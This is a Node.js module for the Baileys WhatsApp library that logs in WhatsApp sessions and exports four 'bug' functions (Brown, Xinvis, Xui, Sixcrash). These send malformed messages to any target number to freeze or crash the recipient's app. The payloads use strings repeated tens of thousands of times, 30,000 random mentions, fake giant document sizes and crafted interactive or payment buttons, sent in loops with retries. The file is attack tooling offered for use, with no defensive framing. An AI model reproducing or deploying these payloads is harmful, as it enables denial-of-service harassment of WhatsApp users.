const { 
  default: makeWASocket, 
  DisconnectReason, 
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  Browsers,
  generateWAMessageFromContent,
  proto
} = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const fs = require("fs-extra");
const path = require("path");
const QRCode = require("qrcode");

// Store active connections
const activeSessions = new Map();
const sessionPath = path.join(__dirname, "..", "data", "sessions");

// Ensure sessions directory exists
fs.ensureDirSync(sessionPath);

function initializeWhatsApp(io) {
  console.log("📱 WhatsApp Manager initialized");
  
  // Clean up any existing sessions on startup
  cleanupSessions();
}

function getActiveSessions() {
  return Array.from(activeSessions.keys());
}

async function connectToWhatsApp(phoneNumber) {
  try {
    console.log(`📱 Connecting WhatsApp for ${phoneNumber}`);
    
    // Check if already connected
    if (activeSessions.has(phoneNumber)) {
      console.log(`📱 ${phoneNumber} already connected`);
      return {
        success: true,
        message: "Already connected",
        isConnected: true
      };
    }
    
    const sessionDir = path.join(sessionPath, phoneNumber);
    fs.ensureDirSync(sessionDir);
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version, isLatest } = await fetchLatestBaileysVersion();
    
    console.log(`Using WA v${version.join(".")}, isLatest: ${isLatest}`);
    
    const sock = makeWASocket({
      version,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, console)
      },
      browser: Browsers.ubuntu("Chrome"),
      printQRInTerminal: false,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false,
      markOnlineOnConnect: false,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      emitOwnEvents: true,
      fireInitQueries: true,
      shouldSyncHistoryMessage: () => false
    });
    
    let qrCodeData = null;
    let isConnected = false;
    
    return new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        if (!isConnected) {
          sock.end();
          reject(new Error("Connection timeout"));
        }
      }, 60000); // 60 second timeout
      
      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr) {
          try {
            qrCodeData = await QRCode.toDataURL(qr);
            console.log(`📱 QR Code generated for ${phoneNumber}`);
          } catch (error) {
            console.error("QR Code generation error:", error);
          }
        }
        
        if (connection === "close") {
          const shouldReconnect = (lastDisconnect?.error)?.output?.statusCode !== DisconnectReason.loggedOut;
          
          console.log(`📱 Connection closed for ${phoneNumber}, reconnecting: ${shouldReconnect}`);
          
          if (activeSessions.has(phoneNumber)) {
            activeSessions.delete(phoneNumber);
          }
          
          if (!isConnected) {
            clearTimeout(timeout);
            if (shouldReconnect) {
              reject(new Error("Connection failed, please try again"));
            } else {
              reject(new Error("Logged out, please scan QR code again"));
            }
          }
        } else if (connection === "open") {
          console.log(`📱 WhatsApp connected successfully for ${phoneNumber}`);
          
          isConnected = true;
          clearTimeout(timeout);
          
          // Store the socket connection
          activeSessions.set(phoneNumber, {
            sock,
            connectedAt: new Date(),
            phoneNumber
          });
          
          resolve({
            success: true,
            message: "Connected successfully",
            isConnected: true,
            qrCode: qrCodeData
          });
        }
      });
      
      sock.ev.on("creds.update", saveCreds);
      
      sock.ev.on("messages.upsert", async (m) => {
        // Handle incoming messages if needed
        console.log("📱 Received messages:", m.messages.length);
      });
      
      // If QR code is needed but connection doesn't open within 30 seconds
      setTimeout(() => {
        if (!isConnected && qrCodeData) {
          clearTimeout(timeout);
          resolve({
            success: true,
            message: "QR Code generated, please scan to connect",
            isConnected: false,
            qrCode: qrCodeData,
            requiresQR: true
          });
        }
      }, 30000);
    });
    
  } catch (error) {
    console.error(`📱 WhatsApp connection error for ${phoneNumber}:`, error);
    return {
      success: false,
      error: error.message
    };
  }
}

async function disconnectSession(phoneNumber) {
  try {
    console.log(`📱 Disconnecting WhatsApp for ${phoneNumber}`);
    
    const session = activeSessions.get(phoneNumber);
    if (session) {
      await session.sock.logout();
      session.sock.end();
      activeSessions.delete(phoneNumber);
      
      // Clean up session files
      const sessionDir = path.join(sessionPath, phoneNumber);
      if (fs.existsSync(sessionDir)) {
        fs.removeSync(sessionDir);
      }
      
      console.log(`📱 ${phoneNumber} disconnected successfully`);
      return {
        success: true,
        message: "Disconnected successfully"
      };
    } else {
      console.log(`📱 ${phoneNumber} was not connected`);
      return {
        success: true,
        message: "Session was not active"
      };
    }
  } catch (error) {
    console.error(`📱 Disconnect error for ${phoneNumber}:`, error);
    throw error;
  }
}

async function requestPairingCode(phoneNumber) {
  try {
    console.log(`📱 Requesting pairing code for ${phoneNumber}`);
    
    const sessionDir = path.join(sessionPath, phoneNumber);
    fs.ensureDirSync(sessionDir);
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();
    
    const sock = makeWASocket({
      version,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, console)
      },
      browser: Browsers.ubuntu("Desktop"),
      printQRInTerminal: false
    });
    
    if (!sock.authState.creds.registered) {
      const code = await sock.requestPairingCode(phoneNumber.replace(/\D/g, ""));
      console.log(`📱 Pairing code for ${phoneNumber}: ${code}`);
      
      sock.ev.on("creds.update", saveCreds);
      
      return code;
    } else {
      throw new Error("Phone number already registered");
    }
  } catch (error) {
    console.error(`📱 Pairing code error for ${phoneNumber}:`, error);
    throw error;
  }
}

async function sendMessage(phoneNumber, targetNumber, message) {
  try {
    const session = activeSessions.get(phoneNumber);
    if (!session) {
      throw new Error("WhatsApp session not found or not connected");
    }
    
    const formattedTarget = targetNumber.includes("@") ? targetNumber : `${targetNumber}@s.whatsapp.net`;
    
    const result = await session.sock.sendMessage(formattedTarget, { text: message });
    
    console.log(`📱 Message sent from ${phoneNumber} to ${targetNumber}`);
    return {
      success: true,
      messageId: result.key.id,
      timestamp: result.messageTimestamp
    };
  } catch (error) {
    console.error(`📱 Send message error:`, error);
    throw error;
  }
}

async function sendBugBrown(target, count = 1, delay = 1000) {
  try {
    console.log(`🐛 Sending Bug Brown to ${target} (count: ${count}, delay: ${delay}ms)`);
    
    const sessions = Array.from(activeSessions.values());
    if (sessions.length === 0) {
      throw new Error("No active WhatsApp sessions");
    }
    
    const session = sessions[0];
    const formattedTarget = target.includes("@") ? target : `${target}@s.whatsapp.net`;
    
    // Advanced Bug Brown payload - interactive message that causes freeze
    const bugData = JSON.stringify({
      status: true,
      criador: "VortexBizguard",
      resultado: {
        type: "md",
        ws: {
          _events: { "CB:ib,,dirty": ["Array"] },
          _eventsCount: 800000,
          _maxListeners: 0,
          url: "wss://web.whatsapp.com/ws/chat",
          config: {
            version: ["Array"],
            browser: ["Array"],
            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
            connectTimeoutMs: 20000,
            keepAliveIntervalMs: 30000,
            logger: {},
            printQRInTerminal: false,
            emitOwnEvents: true,
            defaultQueryTimeoutMs: 60000,
            customUploadHosts: [],
            retryRequestDelayMs: 250,
            maxMsgRetryCount: 5,
            fireInitQueries: true,
            auth: { Object: "authData" },
            markOnlineOnConnect: true,
            syncFullHistory: true,
            linkPreviewImageThumbnailWidth: 192,
            transactionOpts: { Object: "transactionOptsData" },
            generateHighQualityLinkPreview: false,
            options: {},
            appStateMacVerification: { Object: "appStateMacData" },
            mobile: true
          }
        }
      }
    });

    const message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [formattedTarget],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: formattedTarget,
              },
            },
            body: {
              text: "VortexBizguard",
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: bugData + "VortexBug" },
                { name: "call_permission_request", buttonParamsJson: bugData + "\\u0003" },
                { name: "mpm", buttonParamsJson: bugData + "VortexBug" },
              ],
            },
          },
        },
      },
    };
    
    const results = [];
    for (let i = 0; i < count; i++) {
      try {
        await session.sock.relayMessage(formattedTarget, message, { 
          participant: { jid: formattedTarget } 
        });
        
        results.push({
          success: true,
          messageId: `bug_brown_${Date.now()}_${i}`,
          index: i + 1
        });
        
        console.log(`🐛 Bug Brown ${i + 1}/${count} sent to ${target}`);
        
        if (i < count - 1) {
          await new Promise(resolve => setTimeout(resolve, delay));
        }
      } catch (error) {
        console.error(`🐛 Bug Brown ${i + 1} failed:`, error);
        results.push({
          success: false,
          error: error.message,
          index: i + 1
        });
      }
    }
    
    return {
      success: true,
      results,
      totalSent: results.filter(r => r.success).length,
      totalFailed: results.filter(r => !r.success).length
    };
  } catch (error) {
    console.error("🐛 Bug Brown error:", error);
    throw error;
  }
}

async function sendBugXinvis(target, message, count = 1, delay = 1000) {
  try {
    console.log(`🐛 Sending Bug Xinvis to ${target} (count: ${count}, delay: ${delay}ms)`);
    
    const sessions = Array.from(activeSessions.values());
    if (sessions.length === 0) {
      throw new Error("No active WhatsApp sessions");
    }
    
    const session = sessions[0];
    const formattedTarget = target.includes("@") ? target : `${target}@s.whatsapp.net`;
    
    // Advanced Bug Xinvis payload - invisible spam with list structure
    const delayData = Array.from({ length: 30000 }, (_, r) => ({
      title: "᭡꧈".repeat(95000),
      rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "VortexBizguard",
            listType: 2,
            buttonText: null,
            sections: delayData,
            singleSelectReply: { selectedRowId: "🔴" },
            contextInfo: {
              mentionedJid: Array.from({ length: 30000 }, () => 
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
              participant: formattedTarget,
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "333333333333@newsletter",
                serverMessageId: 1,
                newsletterName: "-"
              }
            },
            description: "Vortex Bizguard Bug System"
          }
        }
      },
      contextInfo: {
        channelMessage: true,
        statusAttributionType: 2
      }
    };
    
    const results = [];
    for (let i = 0; i < count; i++) {
      try {
        const msg = generateWAMessageFromContent(formattedTarget, MSG, {});
        await session.sock.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [formattedTarget]
        });
        
        results.push({
          success: true,
          messageId: `bug_xinvis_${Date.now()}_${i}`,
          index: i + 1
        });
        
        console.log(`🐛 Bug Xinvis ${i + 1}/${count} sent to ${target}`);
        
        if (i < count - 1) {
          await new Promise(resolve => setTimeout(resolve, delay));
        }
      } catch (error) {
        console.error(`🐛 Bug Xinvis ${i + 1} failed:`, error);
        results.push({
          success: false,
          error: error.message,
          index: i + 1
        });
      }
    }
    
    return {
      success: true,
      results,
      totalSent: results.filter(r => r.success).length,
      totalFailed: results.filter(r => !r.success).length
    };
  } catch (error) {
    console.error("🐛 Bug Xinvis error:", error);
    throw error;
  }
}

async function sendBugXui(target, message, count = 1, delay = 1000) {
  try {
    console.log(`🐛 Sending Bug Xui to ${target} (count: ${count}, delay: ${delay}ms)`);
    
    const sessions = Array.from(activeSessions.values());
    if (sessions.length === 0) {
      throw new Error("No active WhatsApp sessions");
    }
    
    const session = sessions[0];
    const formattedTarget = target.includes("@") ? target : `${target}@s.whatsapp.net`;
    
    // Advanced Bug Xui payload - UI breaking with group mention and payment request
    const bugMessage = {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/pdf",
                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                fileLength: "1099511627776",
                pageCount: 199183729199991,
                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                fileName: "Vortex Bizguard",
                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1728631701",
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: {
              text: "ꦿꦸ".repeat(50000) + "@1".repeat(70000),
            },
            nativeFlowMessage: {
              messageParamsJson: "Vortex Bizguard",
              buttons: [{
                name: "review_and_pay",
                buttonParamsJson: '{"currency":"IDR","total_amount":{"value":2000000,"offset":100},"reference_id":"4R0F79457Q7","type":"physical-goods","order":{"status":"payment_requested","subtotal":{"value":0,"offset":100},"order_type":"PAYMENT_REQUEST","items":[{"retailer_id":"custom-item-8e93f147-12f5-45fa-b903-6fa5777bd7de","name":"VortexBizguard","amount":{"value":2000000,"offset":100},"quantity":1}]},"additional_note":"VortexBizguard","native_payment_methods":[],"share_payment_status":false}'
              }]
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "120363404154098043@newsletter"),
              groupMentions: [{
                groupJid: "120363404154098043@newsletter",
                groupSubject: "Vortex Bizguard"
              }]
            }
          }
        }
      }
    };
    
    const results = [];
    for (let i = 0; i < count; i++) {
      try {
        await session.sock.relayMessage(formattedTarget, bugMessage, { 
          participant: { jid: formattedTarget } 
        });
        
        results.push({
          success: true,
          messageId: `bug_xui_${Date.now()}_${i}`,
          index: i + 1
        });
        
        console.log(`🐛 Bug Xui ${i + 1}/${count} sent to ${target}`);
        
        if (i < count - 1) {
          await new Promise(resolve => setTimeout(resolve, delay));
        }
      } catch (error) {
        console.error(`🐛 Bug Xui ${i + 1} failed:`, error);
        results.push({
          success: false,
          error: error.message,
          index: i + 1
        });
      }
    }
    
    return {
      success: true,
      results,
      totalSent: results.filter(r => r.success).length,
      totalFailed: results.filter(r => !r.success).length
    };
  } catch (error) {
    console.error("🐛 Bug Xui error:", error);
    throw error;
  }
}

async function sendBugSixcrash(target, count = 1, delay = 1000) {
  try {
    console.log(`🐛 Sending Bug Sixcrash to ${target} (count: ${count}, delay: ${delay}ms)`);
    
    const sessions = Array.from(activeSessions.values());
    if (sessions.length === 0) {
      throw new Error("No active WhatsApp sessions");
    }
    
    const session = sessions[0];
    const formattedTarget = target.includes("@") ? target : `${target}@s.whatsapp.net`;
    
    // Advanced Bug Sixcrash payload - combination of multiple techniques
    const vampire = `_*~@2~*_\n`.repeat(10500);
    const privateChar = 'ꦽ'.repeat(5000);

    const message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "Vortex Bizguard",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: 'Vortex Bizguard!' + vampire + privateChar,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "15056662003@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast"
            },
          },
        },
      },
    };
    
    const results = [];
    for (let i = 0; i < count; i++) {
      try {
        await session.sock.relayMessage(formattedTarget, message, { 
          participant: { jid: formattedTarget } 
        });
        
        results.push({
          success: true,
          messageId: `bug_sixcrash_${Date.now()}_${i}`,
          index: i + 1
        });
        
        console.log(`🐛 Bug Sixcrash ${i + 1}/${count} sent to ${target}`);
        
        if (i < count - 1) {
          await new Promise(resolve => setTimeout(resolve, delay));
        }
      } catch (error) {
        console.error(`🐛 Bug Sixcrash ${i + 1} failed:`, error);
        results.push({
          success: false,
          error: error.message,
          index: i + 1
        });
      }
    }
    
    return {
      success: true,
      results,
      totalSent: results.filter(r => r.success).length,
      totalFailed: results.filter(r => !r.success).length
    };
  } catch (error) {
    console.error("🐛 Bug Sixcrash error:", error);
    throw error;
  }
}

function cleanupSessions() {
  console.log("🧹 Cleaning up WhatsApp sessions...");
  
  // Close all active sessions
  for (const [phoneNumber, session] of activeSessions) {
    try {
      session.sock.end();
      console.log(`🧹 Closed session for ${phoneNumber}`);
    } catch (error) {
      console.error(`🧹 Error closing session for ${phoneNumber}:`, error);
    }
  }
  
  activeSessions.clear();
  console.log("🧹 Session cleanup completed");
}

// Cleanup on process exit
process.on("SIGINT", cleanupSessions);
process.on("SIGTERM", cleanupSessions);

// Helper function to get session for specific phone number
function getSession(phoneNumber) {
  const session = activeSessions.get(phoneNumber);
  return session ? session.sock : null;
}

// Improved error handling for bug functions
async function sendBugWithRetry(bugFunction, target, params, maxRetries = 3) {
  let lastError;
  
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      console.log(`🔄 Attempting bug send (${attempt}/${maxRetries})`);
      return await bugFunction(target, ...params);
    } catch (error) {
      lastError = error;
      console.error(`❌ Bug send attempt ${attempt} failed:`, error.message);
      
      if (attempt < maxRetries) {
        // Wait before retry (exponential backoff)
        const waitTime = Math.pow(2, attempt) * 1000;
        console.log(`⏱️ Waiting ${waitTime}ms before retry...`);
        await new Promise(resolve => setTimeout(resolve, waitTime));
      }
    }
  }
  
  throw lastError;
}

// Enhanced bug execution with session selection
async function executeBugWithSession(bugType, target, params, preferredSession = null) {
  try {
    const sessions = Array.from(activeSessions.values());
    if (sessions.length === 0) {
      throw new Error("No active WhatsApp sessions available");
    }
    
    // Use preferred session if available, otherwise use first available
    let selectedSession;
    if (preferredSession && activeSessions.has(preferredSession)) {
      selectedSession = activeSessions.get(preferredSession);
    } else {
      selectedSession = sessions[0];
    }
    
    console.log(`📱 Using session: ${selectedSession.phoneNumber} for bug execution`);
    
    const bugFunctions = {
      brown: sendBugBrown,
      xinvis: sendBugXinvis,
      xui: sendBugXui,
      sixcrash: sendBugSixcrash
    };
    
    const bugFunction = bugFunctions[bugType];
    if (!bugFunction) {
      throw new Error(`Unknown bug type: ${bugType}`);
    }
    
    return await sendBugWithRetry(bugFunction, target, params);
  } catch (error) {
    console.error(`🚨 Bug execution failed:`, error);
    throw error;
  }
}

// Validate target number format
function validateTarget(target) {
  // Remove all non-digit characters except @
  const cleanTarget = target.replace(/[^\d@.]/g, '');
  
  // Check if it's already in WhatsApp format
  if (cleanTarget.includes('@s.whatsapp.net')) {
    return cleanTarget;
  }
  
  // Check if it's a group ID
  if (cleanTarget.includes('@g.us')) {
    return cleanTarget;
  }
  
  // Handle individual numbers
  let phoneNumber = cleanTarget.replace(/[^0-9]/g, '');
  
  // Add country code if missing (default to Indonesia +62)
  if (!phoneNumber.startsWith('62') && phoneNumber.length < 12) {
    phoneNumber = '62' + phoneNumber.replace(/^0/, '');
  }
  
  return `${phoneNumber}@s.whatsapp.net`;
}

// Get session status
function getSessionStatus(phoneNumber) {
  const session = activeSessions.get(phoneNumber);
  if (!session) {
    return { connected: false, status: 'disconnected' };
  }
  
  return {
    connected: true,
    status: 'connected',
    connectedAt: session.connectedAt,
    phoneNumber: session.phoneNumber
  };
}

module.exports = {
  initializeWhatsApp,
  getActiveSessions,
  connectToWhatsApp,
  disconnectSession,
  requestPairingCode,
  sendMessage,
  sendBugBrown,
  sendBugXinvis,
  sendBugXui,
  sendBugSixcrash,
  cleanupSessions,
  getSession,
  sendBugWithRetry,
  executeBugWithSession,
  validateTarget,
  getSessionStatus
};

